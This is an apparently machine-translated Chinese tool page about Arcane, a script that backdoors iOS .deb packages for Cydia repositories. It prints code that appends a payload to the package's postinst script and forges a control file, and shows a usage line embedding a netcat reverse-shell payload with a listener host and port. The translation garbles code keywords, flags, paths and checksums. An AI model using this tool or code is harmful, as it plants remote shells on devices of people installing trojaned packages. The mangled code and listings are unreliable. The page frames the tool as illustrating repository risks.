# 奥术:一个简单的脚本，设计来后门 iOS 包

> 原文：<https://kalilinuxtutorials.com/arcane/>

[![Arcane : A Simple Script Designed To Backdoor iOS Packages](img/6b7c1e520517abf399ffd7fd66b330a3.png "Arcane : A Simple Script Designed To Backdoor iOS Packages")](https://1.bp.blogspot.com/-AEnjv7QM0ZE/XzqQVifLfbI/AAAAAAAAHWA/ZWriJSPru9MTAvJK8XYFJY8ZEKmqwkuywCLcBGAsYHQ/s1018/Arcane.gif)

Arcane 是一个简单的脚本，旨在后门 iOS 包(iphone-arm)并为 APT 库创建必要的资源。它是为[这份出版物](https://null-byte.com/a-0325421/)创建的，以帮助说明为什么 Cydia 库可能是危险的，以及来自被入侵的 iOS 设备的可能的利用后攻击。

奥术是如何工作的？

要理解 GIF 中发生了什么，解压用 Arcane 创建的包。

**dpkg-deb-r/tmp/Cydia/whois _ 5 . 3 . 2-1 _ iphone OS-arm _ backdoor . deb/tmp/whois-decomp**

注意在`DEBIAN`目录中的`**control**`和`**postinst**`文件。这两个文件都很重要。

**tree/tmp/whois-decomp/

/tmp/whois-decomp/**
├──debian
│├──control
│└──postinst
└──usr
└──bin
└──whois

安装或删除应用程序时，可以将脚本作为软件包的一部分提供。[包维护者脚本](https://www.debian.org/doc/debian-policy/ch-maintainerscripts.html)包括 [preinst、postinst、prerm 和 postrm](https://wiki.debian.org/MaintainerScripts) 文件。Arcane 利用`postinst`文件在安装过程中执行命令。

**#安装后文件。该文件通常负责在安装所需文件后在操作系统上执行命令。开发人员利用它来管理和维护安装的各个方面。Arcane 通过在文件中附加恶意的 Bash 命令来滥用这个功能。**
postinst = " $ tmp/DEBIAN/postinst "；
**#一个处理嵌入到 postinst 文件中的命令执行类型的函数。**
函数 inject_backdoor ()
{
#如果使用–file，`cat`将命令放入 postinst 文件。
if[[" $ infile "]]；然后
猫" $ infile ">>" $ postinst "；
embed = "[$ infile]"；
否则
#如果没有–文件，则使用简单的 Bash 有效负载，如前面的
#所定义。
echo-e " $ payload ">>" $ postinst "；
embed= "通用 shell 命令"；
fi；
状态“embedded $embed into postinst”“嵌入后门出错”；chmod 0755 " $ postinst "
}；

[控制](https://www.debian.org/doc/debian-policy/ch-controlfields.html)文件包含包管理工具在安装包时使用的值。奥术要么修改现有的`control`要么创造它。

**#的“控制”文件模板。大多数 iOS 包都会包含一个控制文件。如果找不到，奥术将使用下面的模板。这里使用了`$hacker`变量来占据各种任意字段。**
**#**
control temp = " Package:com。$hacker.backdoor
名称:$hacker backdoor
版本:1337
版块:app
架构:iphoneos-arm
描述:一个被后门的 iOS 包
作者:$ hacker[https://$ hacker . github . io/](https://$hacker.github.io/)
维护者:$ hacker[https://$ hacker . github . io/](https://$hacker.github.io/)"；
…………..
**#一个`if`语句来检查控制文件。**
如果[[！-f " $ tmp/DEBIAN/control "]]；然后
#如果没有检测到控件，使用模板创建它。
echo " $ control temp ">" $ tmp/DEBIAN/control "；
状态“已创建控制文件”“控制模板出错”；如果一个控制文件存在，Arcane 将简单地重命名这个包
#就像它出现在可用的 Cydia 应用程序列表中一样。此
#使包裹更容易在 Cydia 中定位。
msg“检测到的控制文件”succ'0,/^Name:.战略与经济对话*/s//Name:$ hacker back door/' " $ tmp/DEBIAN/control "；
状态“修改控制文件”“控制出错”；
fi；

**用途**

在 Kali v2020.3 中克隆存储库。

#sudo apt-get 更新；sudo apt-get install-Vy bzip2 netcat-traditional dpkg coreutils # dependencies
# sudo git clone https://github.com/tokyoneon/arcane/opt/arcane
# sudo chown $ USER:$ USER-R/opt/arcane/；CD/opt/arcane
# chmod+x arcane . sh；。/arcane . sh–救命

将命令嵌入给定的包中。更多信息见文章。

。/arcane . sh–输入样本/sed _ 4.5-1 _ iphone OS-arm . deb–lhost–lport<4444>–cy dia–netcat

**包装样品**

回购包括用于测试的包。

#ls 样本/
# rw-r-r–1 根 100748 年 7 月 17 日 18:39 libpt-pkg-dev _ 1 . 8 . 2 . 1-1 _ iphone OS-arm . deb
# rw-r–1 根 142520 年 7 月 22 日 06:21 network-cmds _ 543-1 _ iphone OS-arm . deb
# rw-r–1 根

MD5 总和，在官方 Bingner 存储库中找到。

# MD5 sum samples/* . deb
t1]3f 1712964701580 B3 f 0188305 a55 和 217 c samples/libpt-pkg-dev _ 1 . 8 . 2 . 1-1 _ iphone OS arm . deb
795 CCF 9c 6d 53 DD 60 D2 f74 F7 a 601 f samples/network-cmds _ 543-1 _ iphone OS arm . deb]

[**Download**](https://github.com/tokyoneon/Arcane)